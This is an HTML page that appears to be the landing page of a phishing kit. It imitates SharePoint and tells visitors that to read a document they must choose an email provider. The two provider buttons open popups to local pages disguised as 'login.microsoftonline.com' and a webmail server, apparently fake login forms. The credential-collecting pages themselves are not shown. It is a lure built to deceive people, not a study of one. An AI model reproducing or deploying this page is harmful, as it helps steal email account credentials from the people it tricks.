
<!DOCTYPE html>


<html lang="en">

<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>SharePoint</title>
    <link rel="icon" type="icon" href="icon.ico">
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <link href="./css/style.css" rel="stylesheet">

</head>

  <body>

    <div class="sharepoint">
	 <div class="container-fluid">
	  
	  <div class="col-lg-6 col-md-6 col-sm-6">
	  <div class="sh_logo">
	   <img src="./css/2.png" alt="image">
	  </div>
	  
	  <div class="sh_para">
	   <p>To read the  document</p>
	   <p>please choose your</p>
	   <p>email provider below</p>
	  </div>
	  
	  <div class="sh_link">
	   <ul>
	   <li><a href="javascript:void(0)" onclick="window.open('login.microsoftonline.com','_blank','width=600,height=550');"><img src="./css/6.png" alt="image"></a></li>
	   <li><a href="javascript:void(0)" onclick="window.open('webmailserver','_blank','width=600,height=550');"><img src="./css/8.png" alt="image"></a></li>
	   </ul>
	  </div>

	  
	  </div>
	  
	  <div class="col-lg-6 col-md-6 col-sm-6"></div>
	  
	 </div>
	</div>
    
  

</body></html>